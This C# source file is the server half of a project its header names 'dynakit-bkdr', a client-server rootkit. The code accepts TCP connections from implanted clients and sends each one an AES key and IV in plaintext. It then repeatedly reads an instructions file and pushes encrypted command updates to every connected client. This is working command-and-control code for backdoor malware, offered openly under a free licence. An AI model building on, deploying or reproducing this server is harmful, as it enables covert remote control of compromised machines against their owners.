/*  dynakit-bkdr, dynamic compilation client-server rootkit.
 *  Copyright (C) 2024 Daniel Molinero Lucas
 *
 *  This program is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

using Serilog.Sinks.SystemConsole.Themes;
using System.Net;
using System.Net.Sockets;
using System.Reflection.Metadata;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using ScapeCore.Core.Serialization;
using Serilog;

internal class Server
{
    internal string instructionsPath = string.Empty;
    internal string Instructions { get => File.ReadAllText(instructionsPath); }
    private readonly List<TcpClient> _clients = [];
    private readonly List<Task> _activeClients = [];
    private TcpListener? _server = null;

    private readonly static Type[] _managers =
    {
        typeof(SerializationManager)
    };

    public Server(string path)
    {
        Log.Logger = new LoggerConfiguration().MinimumLevel.Debug().WriteTo.Async(wt => wt.Console(theme: AnsiConsoleTheme.Code)).CreateLogger();
        try
        {
            foreach (var manager in _managers)
            {
                Log.Debug("Initializing {ty} ...", manager);
                RuntimeHelpers.RunClassConstructor(manager.TypeHandle);
            }

        }
        catch (Exception ex)
        {
            Log.Error("Manager constructor errror:{ex}\n{exin}", ex.Message, ex.InnerException?.Message);
            throw;
        }
        this.instructionsPath = path;
    }

    ~Server() => Log.CloseAndFlush();

    internal async Task StartServer(IPAddress iPAddress, int port)
    {
        try
        {
            _server = new TcpListener(iPAddress, port);
            _server.Start();

            new CommandFactory().LogAndProcessCommands();

            Log.Information("Server started. Waiting for connections...");

            await WaitForTcpClients();
        }
        catch (Exception e)
        {
            Log.Error(e.ToString());
        }
        finally
        {
            _server?.Stop();
        }
    }

    private async Task WaitForTcpClients() => await Task.Run(() =>
    {
        while (true)
        {
            if (_server == null) throw new NullReferenceException("Server is not started.");

            var client = _server.AcceptTcpClient();
            _clients.Add(client);
            _activeClients.Add(Task.Run(() => HandleClient(client)));

            Log.Information($"Client connected: {(client.Client.RemoteEndPoint as IPEndPoint)?.Address}");
        }
    });


    private void HandleClient(TcpClient client)
    {
        var guid = Guid.NewGuid();
        var lastInstructions = string.Empty;
        var key = GenerateRandomKey();
        var iv = GenerateRandomIV();
        try
        {
            bool sendKey = true;
            bool sendIV = false;
            var stream = client.GetStream();

            while (true)
            {
                if (sendKey || sendIV)
                {
                    if (sendIV)
                    {
                        Log.Verbose("{a}", iv);
                        stream.Write(iv, 0, iv.Length);
                        sendIV = false;
                    }
                    if (sendKey)
                    {
                        Log.Verbose("{a}", key);
                        stream.Write(key, 0, key.Length);
                        sendKey = false;
                        sendIV = true;
                    }
                }
                else
                {
                    stream.WriteByte(0);
                    Thread.Sleep(50);
                    if (!string.IsNullOrEmpty(Instructions) && lastInstructions != Instructions)
                    {
                        var output = SerializationManager.Serializer?.Serialize(Encrypt(Instructions, key, iv), true) ?? default;
                        if (output.Error != ScapeCore.Core.Serialization.Streamers.ScapeCoreSeralizationStreamer.SerializationError.None)
                            Log.Error("{c}", output.Error);
                        stream.Write(output.Data ?? [0], 0, (int)output.Size);
                        lastInstructions = Instructions;

                        Log.Information("Updated instructions sent to client {guid} from {client} | {size} bytes sent", guid, client.Client.LocalEndPoint?.ToString(), output.Size);
                    }
                }
                Thread.Sleep(1000);
            }
        }
        catch (IOException ex)
        {
            _ = ex;
            Log.Warning($"Client disconnected remotely: {(client.Client.RemoteEndPoint as IPEndPoint)?.Address}");
        }
        catch (Exception e)
        {
            Log.Error(e.Message);
        }
        finally
        {
            client.Close();
        }
    }

    private static byte[] GenerateRandomKey() { using (Aes aes = Aes.Create()) { aes.GenerateKey(); return aes.Key; } }

    private static byte[] GenerateRandomIV() { using (Aes aes = Aes.Create()) { aes.GenerateIV(); return aes.IV; } }

    private static string Encrypt(string text, byte[] key, byte[] iv) { using (var aesAlg = Aes.Create()) { aesAlg.Key = key; aesAlg.IV = iv; var encryptor = aesAlg.CreateEncryptor(); using (MemoryStream msEncrypt = new MemoryStream()) { using (var csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write)) using (var swEncrypt = new StreamWriter(csEncrypt)) swEncrypt.Write(text); return Convert.ToBase64String(msEncrypt.ToArray()); } } }

    private static string Decrypt(string cipherText, byte[] key, byte[] iv) { using (var aesAlg = Aes.Create()) { aesAlg.Key = key; aesAlg.IV = iv; var decryptor = aesAlg.CreateDecryptor(); using (var msDecrypt = new MemoryStream(Convert.FromBase64String(cipherText))) using (var csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read)) using (var srDecrypt = new StreamReader(csDecrypt)) return srDecrypt.ReadToEnd(); } }
}